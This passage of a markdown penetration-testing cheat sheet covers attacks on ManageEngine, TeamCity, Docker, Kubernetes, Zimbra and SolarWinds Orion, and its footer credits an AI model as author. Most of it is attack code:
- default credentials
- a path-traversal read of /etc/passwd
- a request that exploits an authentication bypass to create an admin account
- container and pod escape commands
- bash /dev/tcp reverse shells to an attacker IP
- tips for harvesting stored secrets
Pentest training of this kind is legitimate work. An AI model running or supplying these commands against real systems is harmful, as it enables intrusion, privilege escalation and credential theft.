| ADSelfService Plus | 9251 | Self-service password reset |
| Desktop Central | 8020/8383 | Endpoint management |
| OpManager | 80/443 | Network monitoring |
| Endpoint Central | 8020 | Patching / MDM |

### Enumeration

```bash
# Default creds (most products): admin:admin  or  admin:admin123
curl -sk http://target.com:8080/ | grep -i "manageengine\|servicedesk\|version"

# ServiceDesk Plus
/sdpapi/           # REST API
/Login.do          # Login page
```

### Attacking

```bash
# CVE-2022-47966 — Unauthenticated RCE via SAML (multiple ME products, SAML must be enabled)
# Affects: ServiceDesk, ADManager, ADSelfService, OpManager, etc.
python3 CVE-2022-47966.py -t http://target.com:8080

# CVE-2021-44515 — Auth bypass + RCE (Desktop Central < 10.1.2127.18)
curl -sk 'http://target.com:8020/client-data/../../../../etc/passwd'

# CVE-2021-40539 — Pre-auth RCE (ADSelfService Plus < 6114)
python3 CVE-2021-40539.py -t http://target.com:9251

# CVE-2022-40300 — SQLi (ServiceDesk Plus MSP < 10609)
# Authenticated SQLi → file write → webshell

# Post-auth: Scripting in ServiceDesk Plus
# Admin → General → Custom Scripts → execute on ticket actions
```

> [!note]
> ADSelfService Plus is especially valuable — it handles password resets for AD accounts and often stores or can be abused to reset domain user credentials. Compromise of this service can equal AD access without touching a DC.

---

## TeamCity / JetBrains

### Enumeration

```bash
# Default port: 8111
# Default creds: admin:admin (set on first run)
curl -s http://target.com:8111/ | grep -i "teamcity\|version"

# REST API
curl -s http://target.com:8111/app/rest/server   # version info (may require auth)
```

### Attacking

```bash
# CVE-2024-27198 — Auth bypass → admin account creation (TeamCity < 2023.11.4)
curl -s -X POST 'http://target.com:8111/app/rest/users' \
  -H 'Content-Type: application/json' \
  --path-as-is '/app/rest/users;.jsp' \
  -d '{"username":"hacker","password":"Hacker123!","email":"h@h.com","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}'

python3 CVE-2024-27198.py -t http://target.com:8111

# Post-auth RCE — Build configuration → Build step → Command Line
# Add a build step: Command Line → custom script
bash -i >& /dev/tcp/10.10.14.15/4444 0>&1

# Token-based auth — check for build agent tokens in config files
# Tokens allow triggering builds → RCE via build steps
```

> [!note]
> TeamCity often has access to source code, SSH keys, and deployment credentials stored as build parameters. After gaining access, enumerate all projects and build configs for secrets before going for shells.

---

## Kubernetes / Docker

### Docker

```bash
# Exposed Docker API — default port 2375 (unauthenticated), 2376 (TLS)
curl http://target.com:2375/v1.41/info
curl http://target.com:2375/v1.41/containers/json

# Escape via privileged container / docker socket
# If you have access to /var/run/docker.sock inside a container:
docker -H unix:///var/run/docker.sock run -it --rm \
  --privileged --pid=host \
  alpine nsenter -t 1 -m -u -n -i sh

# Mount host root filesystem
docker -H unix:///var/run/docker.sock run -it --rm \
  -v /:/host alpine chroot /host sh

# From outside — RCE via exposed API
docker -H tcp://target.com:2375 run -it --rm \
  -v /:/host alpine chroot /host sh
```

### Kubernetes

```bash
# Check for exposed API server (default: 6443, 8080 unauthenticated)
curl -sk https://target.com:6443/api/v1/namespaces
curl http://target.com:8080/api/v1/pods   # unauthenticated port (legacy)

# kubectl with stolen token
kubectl --server=https://target.com:6443 --token=<token> --insecure-skip-tls-verify get pods -A

# Enumerate permissions
kubectl auth can-i --list

# Dashboard — exposed without auth
# https://target.com/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# Escape from pod to node
# Mount host path in new pod:
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  containers:
  - name: escape
    image: alpine
    volumeMounts:
    - mountPath: /host
      name: host-vol
    command: ["nsenter","--mount=/host/proc/1/ns/mnt","--","sh","-c","bash -i >& /dev/tcp/10.10.14.15/4444 0>&1"]
  volumes:
  - name: host-vol
    hostPath:
      path: /
  hostPID: true
EOF
```

> [!note]
> Service account tokens are often mounted automatically in pods at `/var/run/secrets/kubernetes.io/serviceaccount/token`. If you land in a container, always check this first — the token may have `cluster-admin` privileges.

---

## Zimbra

### Enumeration

```bash
# Default ports: 80, 443, 7071 (admin console), 7072 (LDAP proxy)
curl -sk https://target.com/ | grep -i "zimbra\|version"
curl -sk https://target.com/zimbra/   # webmail login
# Admin console: https://target.com:7071/zimbraAdmin/
```

### Attacking

```bash
# CVE-2022-27925 + CVE-2022-37042 — Unauthenticated RCE via mboximport (Zimbra < 9.0.0.p27)
python3 CVE-2022-27925.py -t https://target.com

# CVE-2022-41352 — Unauthenticated RCE via cpio archive extract (Zimbra < 9.0.0.p29)
# Send malicious email attachment → extract drops webshell
python3 CVE-2022-41352.py -t target.com -l 10.10.14.15 -p 4444

# CVE-2023-37580 — Reflected XSS → session steal (Zimbra < 8.8.15.p41)

# Default admin creds check
curl -sk -X POST 'https://target.com:7071/service/admin/soap' \
  -d '<AuthRequest xmlns="urn:zimbraAdmin"><name>admin</name><password>zimbra</password></AuthRequest>'

# Post-auth webshell path
# Zimbra webroot: /opt/zimbra/jetty/webapps/zimbra/
```

---

## SolarWinds Orion

### Enumeration

```bash
# Default port: 8787 (HTTP), 443 (HTTPS)
# Login: https://target.com:8787/Orion/Login.aspx
curl -sk https://target.com:8787/ | grep -i "solarwinds\|orion"

# Default creds: admin:admin
```

### Attacking

```bash
# CVE-2020-10148 — Auth bypass (Orion Platform < 2020.2.1)
# Append ?SolarWindsOrionAccountID=Admin to bypass auth check
curl -sk 'https://target.com:8787/WebResource.axd?SolarWindsOrionAccountID=Admin'

# Post-auth RCE via Orion Job Scheduler
# Settings → Manage Jobs → Create job → execute PowerShell
# Or via the Orion API:
curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json/Query' \
  -u admin:admin \
  -d '{"query":"SELECT * FROM Orion.Nodes"}'

# SUNBURST/SUNSPOT context — if you find Orion, assume it has broad network visibility
# Check connected agents — Orion has WMI/SNMP/SSH access to monitored hosts
```

> [!note]
> SolarWinds Orion typically has monitoring credentials (SNMP community strings, WMI credentials, SSH keys) stored for every device it monitors. Compromising Orion = read access to large portions of the network.

---

*Created: 2026-03-20*
*Updated: 2026-03-20*
*Model: claude-sonnet-4-6*
